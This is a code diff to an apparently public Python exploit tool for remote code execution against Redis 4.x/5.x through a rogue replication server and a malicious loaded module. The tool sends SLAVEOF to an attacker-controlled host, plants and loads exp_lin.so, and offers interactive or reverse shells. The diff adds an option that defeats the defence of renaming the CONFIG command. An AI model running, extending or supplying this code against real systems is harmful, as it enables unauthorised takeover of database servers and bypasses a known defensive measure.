@@ -19,6 +19,7 @@ LOGO = R"""
 
 """
 
+
 def mk_cmd_arr(arr):
     cmd = ""
     cmd += "*" + str(len(arr))
@@ -39,7 +40,8 @@ def din(sock, cnt):
         if len(msg) < 300:
             print("\033[1;34;40m[->]\033[0m {}".format(msg))
         else:
-            print("\033[1;34;40m[->]\033[0m {}......{}".format(msg[:80], msg[-80:]))
+            print(
+                "\033[1;34;40m[->]\033[0m {}......{}".format(msg[:80], msg[-80:]))
     if sys.version_info < (3, 0):
         res = re.sub(r'[^\x00-\x7f]', r'', msg)
     else:
@@ -57,7 +59,8 @@ def dout(sock, msg):
         if len(msg) < 300:
             print("\033[1;32;40m[<-]\033[0m {}".format(msg))
         else:
-            print("\033[1;32;40m[<-]\033[0m {}......{}".format(msg[:80], msg[-80:]))
+            print(
+                "\033[1;32;40m[<-]\033[0m {}......{}".format(msg[:80], msg[-80:]))
 
 
 def decode_shell_result(s):
@@ -70,7 +73,6 @@ class Remote:
         self._port = rport
         self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self._sock.connect((self._host, self._port))
-
 
     def send(self, msg):
         dout(self._sock, msg)
@@ -129,7 +131,8 @@ class RogueServer:
     def exp(self):
         try:
             cli, addr = self._sock.accept()
-            print("\033[92m[+]\033[0m Accepted connection from {}:{}".format(addr[0], addr[1]))
+            print(
+                "\033[92m[+]\033[0m Accepted connection from {}:{}".format(addr[0], addr[1]))
             while True:
                 data = din(cli, 1024)
                 if len(data) == 0:
@@ -166,7 +169,8 @@ def interact(remote):
                 return
             r = remote.shell_cmd(cmd)
             if 'unknown command' in r:
-                print("\033[1;31;m[-]\033[0m Error:{} , check your module!".format(r.strip()))
+                print(
+                    "\033[1;31;m[-]\033[0m Error:{} , check your module!".format(r.strip()))
                 return
             for l in decode_shell_result(r).split("\n"):
                 if l:
@@ -174,23 +178,26 @@ def interact(remote):
     except KeyboardInterrupt:
         return
 
+
 def cleanup(remote, expfile):
     # clean up
     print("[*] Clean up..")
-    remote.do("CONFIG SET dbfilename dump.rdb")
+    remote.do("{} SET dbfilename dump.rdb".format(config))
     remote.shell_cmd("rm ./{}".format(expfile))
     remote.do("MODULE UNLOAD system")
     remote.close()
 
+
 def printback(remote):
     back = remote._sock.getpeername()
-    print("\033[92m[+]\033[0m Accepted connection from {}:{}".format(back[0], back[1]))
+    print(
+        "\033[92m[+]\033[0m Accepted connection from {}:{}".format(back[0], back[1]))
 
 
 def runserver(rhost, rport, lhost, lport):
     # get expolit filename
     expfile = os.path.basename(filename)
-    #start exploit
+    # start exploit
     try:
         remote = Remote(rhost, rport)
         if auth:
@@ -204,12 +211,11 @@ def runserver(rhost, rport, lhost, lport):
                 print("\033[1;31;m[-]\033[0m Need password.")
                 return
 
-
         print("[*] Sending SLAVEOF command to server")
         remote.do("SLAVEOF {} {}".format(lhost, lport))
         printback(remote)
         print("[*] Setting filename")
-        remote.do("CONFIG SET dbfilename {}".format(expfile))
+        remote.do("{} SET dbfilename {}".format(config, expfile))
         printback(remote)
         sleep(2)
         print("[*] Start listening on {}:{}".format(lhost, lport))
@@ -222,7 +228,8 @@ def runserver(rhost, rport, lhost, lport):
         print("[*] Closing rogue server...\n")
         rogue.close()
         # Operations here
-        choice = input("\033[92m[+]\033[0m What do u want ? [i]nteractive shell or [r]everse shell or [e]xit: ")
+        choice = input(
+            "\033[92m[+]\033[0m What do u want ? [i]nteractive shell or [r]everse shell or [e]xit: ")
         if choice.startswith("i"):
             interact(remote)
         elif choice.startswith("r"):
@@ -236,26 +243,35 @@ def runserver(rhost, rport, lhost, lport):
     except Exception as e:
         print("\033[1;31;m[-]\033[0m Error found : {} \n[*] Exit..".format(e))
 
+
 def main():
-    parser = argparse.ArgumentParser(description='Redis 4.x/5.x RCE with RedisModules')
-    parser.add_argument("-r", "--rhost", dest="rhost", type=str, help="target host", required=True)
+    parser = argparse.ArgumentParser(
+        description='Redis 4.x/5.x RCE with RedisModules')
+    parser.add_argument("-r", "--rhost", dest="rhost",
+                        type=str, help="target host", required=True)
     parser.add_argument("-p", "--rport", dest="rport", type=int,
                         help="target redis port, default 6379", default=6379)
     parser.add_argument("-L", "--lhost", dest="lhost", type=str,
                         help="rogue server ip", required=True)
     parser.add_argument("-P", "--lport", dest="lport", type=int,
                         help="rogue server listen port, default 21000", default=21000)
-    parser.add_argument("-f", "--file", type=str, help="RedisModules to load, default exp.so", default='exp_lin.so')
-    parser.add_argument("-a", "--auth", dest="auth", type=str, help="redis password")
-    parser.add_argument("-v", "--verbose", action="store_true", help="show more info", default=False)
+    parser.add_argument("-f", "--file", type=str,
+                        help="RedisModules to load, default exp.so", default='exp_lin.so')
+    parser.add_argument("-a", "--auth", dest="auth",
+                        type=str, help="redis password")
+    parser.add_argument("-C", "--config", dest="config", type=str,
+                        help="config command name,rename config bd65100085", default='config')
+    parser.add_argument("-v", "--verbose", action="store_true",
+                        help="show more info", default=False)
     options = parser.parse_args()
     # runserver("127.0.0.1", 6379, "127.0.0.1", 21000)
 
     print("[*] Connecting to  {}:{}...".format(options.rhost, options.rport))
-    global payload, verbose, filename, auth
+    global payload, verbose, filename, auth, config
     auth = options.auth
     filename = options.file
     verbose = options.verbose
+    config = options.config
     if os.path.exists(filename) == False:
         print("\033[1;31;m[-]\033[0m Where you module? ")
         exit(0)
